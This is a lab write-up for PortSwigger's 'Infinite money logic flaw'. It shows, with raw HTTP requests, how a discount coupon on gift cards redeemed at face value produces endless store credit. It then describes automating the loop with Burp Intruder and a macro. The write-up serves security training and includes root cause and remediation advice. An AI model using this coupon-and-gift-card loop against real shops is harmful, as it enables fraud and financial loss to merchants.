# PortSwigger Lab: Infinite money logic flaw

# TAGS: Business Logic, Gift Card Arbitrage, Coupon Abuse, Burp Intruder

Category: Business Logic
Date: October 27, 2026
Day: Tuesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. The flaw is a money loop: a discount coupon can be applied to a **gift card**, and the gift card is then redeemed at **face value**. Buying a $10 gift card for $7 and redeeming it for $10 adds **$3 per cycle** to the store credit. Repeat the loop enough times and you can afford the leather jacket.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says there is a logic flaw in the purchasing workflow. The goal is to buy the **Lightweight l33t leather jacket** ($1337.00). The lab provides the credentials **wiener:peter**.

I logged in and opened `/my-account`:

```http
GET /my-account?id=wiener HTTP/2
Host: 0ac700400384c191827174dd00e60099.web-security-academy.net
Cookie: session=tZTWsVQzvV4JNVHcHV5gNomjXqfOHA5n
```

The store credit was **$100.00**, and the account page has a **Gift cards** section where a code can be redeemed. The store also sells **$10 gift cards** (`productId=2`).

To get a discount, I signed up for the newsletter, which returned a coupon:

```http
GET /?sign-up-confirmed=true HTTP/2
Host: 0ac700400384c191827174dd00e60099.web-security-academy.net
```

The coupon is **`SIGNUP30`** (30% off).

---

## Exploitation:

#### Step 1: Buy a gift card with the coupon

I added a $10 gift card to the cart:

```http
POST /cart HTTP/2
Host: 0ac700400384c191827174dd00e60099.web-security-academy.net
Cookie: session=tZTWsVQzvV4JNVHcHV5gNomjXqfOHA5n
Content-Type: application/x-www-form-urlencoded

productId=2&redir=PRODUCT&quantity=1
```

Then I applied the coupon:

```http
POST /cart/coupon HTTP/2
Host: 0ac700400384c191827174dd00e60099.web-security-academy.net
Cookie: session=tZTWsVQzvV4JNVHcHV5gNomjXqfOHA5n
Content-Type: application/x-www-form-urlencoded

csrf=O2I2hln47JNHWtpFt7tP0A3CeE7vXAEm&coupon=SIGNUP30
```

The total dropped from $10 to **$7**.

#### Step 2: Check out and redeem the gift card

I completed the order:

```http
POST /cart/checkout HTTP/2
Host: 0ac700400384c191827174dd00e60099.web-security-academy.net
Cookie: session=tZTWsVQzvV4JNVHcHV5gNomjXqfOHA5n
Content-Type: application/x-www-form-urlencoded

csrf=O2I2hln47JNHWtpFt7tP0A3CeE7vXAEm
```

```http
HTTP/2 303 See Other
Location: /cart/order-confirmation?order-confirmed=true
```

The confirmation page contains the **gift card code**. I copied it and redeemed it from `/my-account`:

```http
POST /gift-card HTTP/2
Host: 0ac700400384c191827174dd00e60099.web-security-academy.net
Cookie: session=tZTWsVQzvV4JNVHcHV5gNomjXqfOHA5n
Content-Type: application/x-www-form-urlencoded

csrf=O2I2hln47JNHWtpFt7tP0A3CeE7vXAEm&gift-card=rQOP3qc63h
```

The account was credited with **$10**, while only **$7** had been spent. Net profit: **$3 per cycle**.

#### Step 3: Automate the loop

Doing this by hand hundreds of times is not practical, so I automated the whole sequence:

```
POST /cart
POST /cart/coupon
POST /cart/checkout
GET  /cart/order-confirmation?order-confirmed=true
POST /gift-card
```

With Burp, I used **Intruder + a session-handling macro**: the macro replays that sequence and extracts the gift card code from the confirmation response into the `gift-card` parameter of the `POST /gift-card` request. I ran it with a **single-threaded resource pool** and a **Null payload** (~412 requests, one per cycle).

A Python alternative is in `scripts/infinite_money_gift_card.py`, which performs the same cycle and stops when the credit reaches $1337.

#### Step 4: Buy the jacket

When the store credit was high enough, I added the leather jacket (`productId=1`) and checked out normally. The lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

Two business rules interact badly:

1. The **discount coupon is applied to gift cards**, even though a gift card is effectively cash.
2. The **gift card is redeemed at face value**, independent of what was paid for it.

So the application creates a guaranteed arbitrage: pay $7 for an asset worth $10, redeem it, repeat. Nothing caps the number of cycles or detects the unusual pattern.

---

## Impact

An attacker can generate **unlimited store credit** and buy any product for free — direct and unbounded financial loss. In a real store, the same flaw could be automated at scale, drain inventory, and be combined with refunds or cash-out features to convert the credit into real money.

---

## Remediation

To prevent this issue, applications should:

- **Never apply discount coupons to gift cards** (or to any cash-equivalent product);
- Redeem gift cards at the amount actually paid, or restrict redemptions to non-discounted purchases;
- Enforce a **maximum face value** and a limit on gift card purchases/redemptions per account;
- Monitor for abnormal cycles (buy → redeem → buy) and rate-limit them;
- Recompute totals and validate the full workflow server-side at each step.

---

## Key Takeaways

1. Coupons + gift cards are a classic money loop: discount on the way in, face value on the way out.
2. A single $3 profit per cycle becomes unlimited money once automated.
3. Intruder + a session-handling macro is enough to repeat a multi-step purchase/redeem sequence.
4. Business rules must be validated together, not in isolation.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Infinite money logic flaw (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
